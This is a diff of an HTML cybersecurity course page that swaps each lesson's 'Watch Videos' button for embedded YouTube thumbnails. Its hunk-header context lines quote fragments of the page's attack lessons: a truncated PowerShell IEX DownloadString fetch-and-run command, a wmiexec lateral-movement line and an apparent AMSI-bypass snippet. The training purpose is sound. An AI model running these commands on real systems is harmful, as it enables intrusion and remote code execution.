@@ -305,6 +305,16 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
 .vid-btn:hover{background:rgba(74,222,128,.18);border-color:var(--grn);box-shadow:0 0 15px rgba(74,222,128,.12)}
 .vid-btn:active{transform:scale(.95)}
 
+.vid-embeds{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px;margin:12px 0}
+.vid-thumb{position:relative;border-radius:8px;overflow:hidden;cursor:pointer;border:1px solid rgba(74,222,128,.15);transition:all .2s;background:#0d1117}
+.vid-thumb:hover{border-color:var(--grn);box-shadow:0 0 20px rgba(74,222,128,.15);transform:translateY(-2px)}
+.vid-thumb img{width:100%;aspect-ratio:16/9;object-fit:cover;display:block}
+.vid-thumb .play-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35);transition:background .2s}
+.vid-thumb:hover .play-overlay{background:rgba(74,222,128,.15)}
+.play-btn-icon{width:48px;height:48px;border-radius:50%;background:rgba(74,222,128,.9);display:flex;align-items:center;justify-content:center;font-size:1.2rem;color:#000;box-shadow:0 0 20px rgba(74,222,128,.4);transition:transform .2s}
+.vid-thumb:hover .play-btn-icon{transform:scale(1.1)}
+.vid-thumb .ch-label{position:absolute;bottom:0;left:0;right:0;padding:6px 10px;background:linear-gradient(transparent,rgba(0,0,0,.85));color:var(--txt2);font-size:.65rem;font-family:var(--mono);letter-spacing:.3px}
+
 #sm{display:none;position:fixed;inset:0;z-index:1000;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);align-items:flex-start;justify-content:center;padding-top:14vh}
 #sm.show{display:flex;animation:fadeIn .15s}
 .sbox{background:var(--bg1);border:1px solid var(--bdr);border-radius:10px;width:90%;max-width:480px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,.4);animation:fadeInUp .2s ease}
@@ -414,7 +424,6 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
         <button class="tb-btn sync-btn-icon" id="syncTrig" title="Sync Progress" style="border-color:rgba(249,115,22,.2)!important">&#8644;</button>
         <button class="tb-btn" id="shareBtn" title="Share" style="border-color:rgba(56,189,248,.2)!important;font-size:.7rem">&#8599;</button>
         <button class="tb-btn term-btn" id="termTog" title="Terminal (Ctrl+`)">&#9618;</button>
-        <button class="tb-btn" id="vidTog" title="Videos (Ctrl+Shift+V)" style="border-color:rgba(74,222,128,.2)!important">&#9654;</button>
         <button class="tb-btn" id="pB" title="Previous">&#8592;</button>
         <button class="tb-btn" id="nB" title="Next">&#8594;</button>
       </div>
@@ -980,7 +989,18 @@ td{padding:6px 8px;border:1px solid var(--bdr);color:var(--txt2);vertical-align:
   <div class="hint">Try searching for "largest data breaches 2024" or visit securityweek.com for recent incidents.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('foundations')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('foundations','Oielgo_hvRE')">
+  <img src="https://img.youtube.com/vi/Oielgo_hvRE/mqdefault.jpg" alt="Networking Course" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Networking Course</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('foundations','sWbUDq4S6Y8')">
+  <img src="https://img.youtube.com/vi/sWbUDq4S6Y8/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does CIA stand for in cybersecurity?</p>
@@ -1726,7 +1746,18 @@ parse_nmap_output() {
   <div class="hint">The numbers in chmod represent: owner(7=rwx), group(5=rx), others(5=rx)</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('linux')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('linux','sWbUDq4S6Y8')">
+  <img src="https://img.youtube.com/vi/sWbUDq4S6Y8/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('linux','tKJhn2iVpXE')">
+  <img src="https://img.youtube.com/vi/tKJhn2iVpXE/mqdefault.jpg" alt="LearnLinuxTV" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">LearnLinuxTV</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What command creates a new empty file?</p>
@@ -2561,7 +2592,18 @@ DISPLAY=:0 xfce4-terminal &</code></pre>
   <div class="hint">Always install Termux from F-Droid — the Play Store version is outdated and missing features.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('termux')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('termux','HElZqb3Mq1g')">
+  <img src="https://img.youtube.com/vi/HElZqb3Mq1g/mqdefault.jpg" alt="NetworkChuck" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">NetworkChuck</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('termux','sWbUDq4S6Y8')">
+  <img src="https://img.youtube.com/vi/sWbUDq4S6Y8/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>Where should you install Termux from?</p>
@@ -3147,7 +3189,18 @@ arpwatch -i eth0</code></pre>
   <div class="hint">These commands help you understand how data flows across networks — essential knowledge for both attackers and defenders.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('networking')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('networking','Oielgo_hvRE')">
+  <img src="https://img.youtube.com/vi/Oielgo_hvRE/mqdefault.jpg" alt="Networking Course" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Networking Course</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('networking','sWbUDq4S6Y8')">
+  <img src="https://img.youtube.com/vi/sWbUDq4S6Y8/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>Which OSI layer do routers operate on?</p>
@@ -3763,7 +3816,18 @@ exiftool -r /path/to/images/
   <div class="hint">Start with passive recon techniques — they don't touch the target and are completely legal.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('recon')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('recon','qwA6MmbeGNo')">
+  <img src="https://img.youtube.com/vi/qwA6MmbeGNo/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('recon','LkA3H3caE8Y')">
+  <img src="https://img.youtube.com/vi/LkA3H3caE8Y/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does OSINT stand for?</p>
@@ -4487,7 +4551,18 @@ xprobe2 192.168.1.1
   <div class="hint">Always start with a localhost scan to understand what's running on your own machine before scanning remote targets.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('scanning')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('scanning','wNA4CLG-OSM')">
+  <img src="https://img.youtube.com/vi/wNA4CLG-OSM/mqdefault.jpg" alt="whitesec" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">whitesec</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('scanning','fNzpcB7ODxQ')">
+  <img src="https://img.youtube.com/vi/fNzpcB7ODxQ/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does the -sV flag do in Nmap?</p>
@@ -5035,7 +5110,18 @@ Both Red and Blue teams use MITRE ATT&amp;CK as their common language. Red teams
   <div class="hint">The 5 phases are: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('ethicalhack')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('ethicalhack','fNzpcB7ODxQ')">
+  <img src="https://img.youtube.com/vi/fNzpcB7ODxQ/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('ethicalhack','TTw-EY7F1rM')">
+  <img src="https://img.youtube.com/vi/TTw-EY7F1rM/mqdefault.jpg" alt="Ryan John" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Ryan John</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What must you have before starting a penetration test?</p>
@@ -6044,7 +6130,18 @@ sys.stdout.buffer.write(payload)
   <div class="hint">Metasploit has thousands of modules. Start by learning the basic workflow: search → use → set → exploit.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('exploitation')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('exploitation','wNA4CLG-OSM')">
+  <img src="https://img.youtube.com/vi/wNA4CLG-OSM/mqdefault.jpg" alt="whitesec" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">whitesec</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('exploitation','fNzpcB7ODxQ')">
+  <img src="https://img.youtube.com/vi/fNzpcB7ODxQ/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does a reverse shell do?</p>
@@ -6903,7 +7000,18 @@ The top 1% of bug bounty researchers earn $100K+/year. The average active resear
   <div class="hint">Start with VDPs (Vulnerability Disclosure Programs) — they're beginner-friendly and don't offer cash rewards, making them less competitive.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('bugbounty')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('bugbounty','TTw-EY7F1rM')">
+  <img src="https://img.youtube.com/vi/TTw-EY7F1rM/mqdefault.jpg" alt="Ryan John" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Ryan John</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('bugbounty','FqnSAa2KmBI')">
+  <img src="https://img.youtube.com/vi/FqnSAa2KmBI/mqdefault.jpg" alt="HackerOne" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">HackerOne</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What is a VDP?</p>
@@ -7534,7 +7642,18 @@ maigret username --html -o report.html</code></pre></div>
   <div class="hint">Start with one tool at a time. Master each before moving to the next.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('tools')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('tools','sWbUDq4S6Y8')">
+  <img src="https://img.youtube.com/vi/sWbUDq4S6Y8/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('tools','HElZqb3Mq1g')">
+  <img src="https://img.youtube.com/vi/HElZqb3Mq1g/mqdefault.jpg" alt="NetworkChuck" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">NetworkChuck</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>Which tool is used for network scanning?</p>
@@ -7881,7 +8000,18 @@ powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://
   <div class="hint">LinPEAS automatically identifies privilege escalation vectors. Red/Yellow items are high-priority findings.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('privesc')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('privesc','wNA4CLG-OSM')">
+  <img src="https://img.youtube.com/vi/wNA4CLG-OSM/mqdefault.jpg" alt="whitesec" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">whitesec</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('privesc','fNzpcB7ODxQ')">
+  <img src="https://img.youtube.com/vi/fNzpcB7ODxQ/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does SUID mean?</p>
@@ -8200,7 +8330,18 @@ wmiexec.py -k -no-pass target.local@dc.target.local</code></pre></div>
   <div class="hint">Always practice in an isolated lab environment. Never use persistence techniques on systems you don't own.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('postexp')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('postexp','56NDgBOSpUg')">
+  <img src="https://img.youtube.com/vi/56NDgBOSpUg/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('postexp','LH0Y4Y7yOhI')">
+  <img src="https://img.youtube.com/vi/LH0Y4Y7yOhI/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What is lateral movement?</p>
@@ -8956,7 +9097,18 @@ http://target.com/www.zip</code></pre></div>
   <div class="hint">DVWA is designed to be hacked — install it locally with Docker for a safe practice environment.</div>
 </div>
 
-<button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('websecurity')">&#9654; Watch Videos</button>
+<div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('websecurity','X4eRbHgRawI')">
+  <img src="https://img.youtube.com/vi/X4eRbHgRawI/mqdefault.jpg" alt="freeCodeCamp" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">freeCodeCamp</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('websecurity','qiQRmQ7B8tM')">
+  <img src="https://img.youtube.com/vi/qiQRmQ7B8tM/mqdefault.jpg" alt="HackerSploit" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">HackerSploit</div>
+</div>
+</div>
 <div class="quiz">
   <h4>📝 Quick Quiz</h4>
   <p>What does XSS stand for?</p>
@@ -9118,7 +9270,18 @@ crontab -l; ls /etc/cron.d/</code></pre>
     <div class="hint">Look for outdated OS versions, unnecessary services, and excessive user accounts.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('ossecurity')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('ossecurity','v3iUx2SNspY')">
+  <img src="https://img.youtube.com/vi/v3iUx2SNspY/mqdefault.jpg" alt="WsCube Cyber" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">WsCube Cyber</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('ossecurity','S0V4aOmkNzY')">
+  <img src="https://img.youtube.com/vi/S0V4aOmkNzY/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is the Windows Registry?</p>
@@ -9285,7 +9448,18 @@ ltrace ./malware
     <div class="hint">The EICAR test file is a safe, standardized file that all antivirus products recognize as malware.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('malware')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('malware','qA0YcYMRWyI')">
+  <img src="https://img.youtube.com/vi/qA0YcYMRWyI/mqdefault.jpg" alt="HuskyHacks" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">HuskyHacks</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('malware','ePHChGthcvk')">
+  <img src="https://img.youtube.com/vi/ePHChGthcvk/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is a rootkit?</p>
@@ -9452,7 +9626,18 @@ Linux:
     <div class="hint">In real forensics, you would use dd with a write-blocker and calculate hash values to verify integrity.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('forensics')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('forensics','jrYFwBU7Xrc')">
+  <img src="https://img.youtube.com/vi/jrYFwBU7Xrc/mqdefault.jpg" alt="Simplilearn" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Simplilearn</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('forensics','McF3T8Z8n0M')">
+  <img src="https://img.youtube.com/vi/McF3T8Z8n0M/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is chain of custody?</p>
@@ -9598,7 +9783,18 @@ BadUSB: USB HID injection (Rubber Ducky compatible)</p></div>
     <div class="hint">Make sure your WiFi adapter supports monitor mode. Not all built-in adapters do.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('wireless')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('wireless','wsa8N_lREN8')">
+  <img src="https://img.youtube.com/vi/wsa8N_lREN8/mqdefault.jpg" alt="WsCube Cyber" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">WsCube Cyber</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('wireless','XQrMK8m1vYc')">
+  <img src="https://img.youtube.com/vi/XQrMK8m1vYc/mqdefault.jpg" alt="NetworkChuck" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">NetworkChuck</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is an evil twin attack?</p>
@@ -9723,7 +9919,18 @@ hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule</code></pre>
     <div class="hint">Notice how the same input produces completely different hashes with different algorithms. This is why hash type matters for security.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('crypto')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('crypto','C7vmouDOJYM')">
+  <img src="https://img.youtube.com/vi/C7vmouDOJYM/mqdefault.jpg" alt="Simplilearn" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Simplilearn</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('crypto','H9KTK2s7NiY')">
+  <img src="https://img.youtube.com/vi/H9KTK2s7NiY/mqdefault.jpg" alt="NetworkChuck" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">NetworkChuck</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What makes bcrypt better than MD5?</p>
@@ -9874,7 +10081,18 @@ curl -k -H "Authorization: Bearer $TOKEN" \
     <div class="hint">Only test buckets you own or have authorization to test. Misconfigured S3 buckets are a common source of data breaches.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('cloud')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('cloud','XsRBDJ5hcdg')">
+  <img src="https://img.youtube.com/vi/XsRBDJ5hcdg/mqdefault.jpg" alt="Tech With Soleyman" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Tech With Soleyman</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('cloud','IA2YqasHQhI')">
+  <img src="https://img.youtube.com/vi/IA2YqasHQhI/mqdefault.jpg" alt="NetworkChuck" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">NetworkChuck</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is container escape?</p>
@@ -10035,7 +10253,18 @@ mitmproxy --mode transparent --set stream_large_bodies=1m</code></pre>
     <div class="hint">AndroidManifest.xml contains permissions, activities, and services - it's the blueprint of an Android app.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('mobile')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('mobile','qA0YcYMRWyI')">
+  <img src="https://img.youtube.com/vi/qA0YcYMRWyI/mqdefault.jpg" alt="HuskyHacks" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">HuskyHacks</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('mobile','ePHChGthcvk')">
+  <img src="https://img.youtube.com/vi/ePHChGthcvk/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is the AndroidManifest.xml?</p>
@@ -10158,7 +10387,18 @@ $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
     <div class="hint">Only use C2 frameworks in authorized lab environments or during approved engagements.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('redteam')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('redteam','fNzpcB7ODxQ')">
+  <img src="https://img.youtube.com/vi/fNzpcB7ODxQ/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('redteam','d1fnoJfQpHo')">
+  <img src="https://img.youtube.com/vi/d1fnoJfQpHo/mqdefault.jpg" alt="HackerSploit" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">HackerSploit</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What does C2 stand for?</p>
@@ -10334,7 +10574,18 @@ tags:
     <div class="hint">Look for patterns: repeated failures from the same IP may indicate a brute-force attack.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('blueteam')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('blueteam','56NDgBOSpUg')">
+  <img src="https://img.youtube.com/vi/56NDgBOSpUg/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('blueteam','LH0Y4Y7yOhI')">
+  <img src="https://img.youtube.com/vi/LH0Y4Y7yOhI/mqdefault.jpg" alt="John Hammond" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">John Hammond</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is a SIEM?</p>
@@ -10471,7 +10722,18 @@ Install-ADDSForest -DomainName corp.local
     <div class="hint">Always keep vulnerable VMs on an isolated network (Host-Only) so they can't be accessed from the internet.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('homelab')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('homelab','v3iUx2SNspY')">
+  <img src="https://img.youtube.com/vi/v3iUx2SNspY/mqdefault.jpg" alt="WsCube Cyber" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">WsCube Cyber</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('homelab','kGHbmASJ4yU')">
+  <img src="https://img.youtube.com/vi/kGHbmASJ4yU/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>What is a vulnerability lab?</p>
@@ -10581,7 +10843,18 @@ Install-ADDSForest -DomainName corp.local
     <div class="hint">Start with beginner-friendly certs like CompTIA Security+ before moving to advanced ones like OSCP.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('career')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('career','gXKNHYTgFnA')">
+  <img src="https://img.youtube.com/vi/gXKNHYTgFnA/mqdefault.jpg" alt="The Cyber Mentor" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">The Cyber Mentor</div>
+</div>
+<div class="vid-thumb" onclick="window._openVidPanel && window._openVidPanel('career','EhJUfHSj9fM')">
+  <img src="https://img.youtube.com/vi/EhJUfHSj9fM/mqdefault.jpg" alt="Professor Messer" loading="lazy">
+  <div class="play-overlay"><div class="play-btn-icon">&#9654;</div></div>
+  <div class="ch-label">Professor Messer</div>
+</div>
+</div>
   <div class="quiz">
     <h4>&#128221; Quick Quiz</h4>
     <p>Which is a beginner cybersecurity certification?</p>
@@ -10741,7 +11014,18 @@ Install-ADDSForest -DomainName corp.local
     <div class="hint">A proper ROE document protects both the tester and the client legally.</div>
   </div>
 
-  <button class="vid-btn" onclick="window._openVidPanel && window._openVidPanel('legal')">&#9654; Watch Videos</button>
+  <div class="vid-embeds">
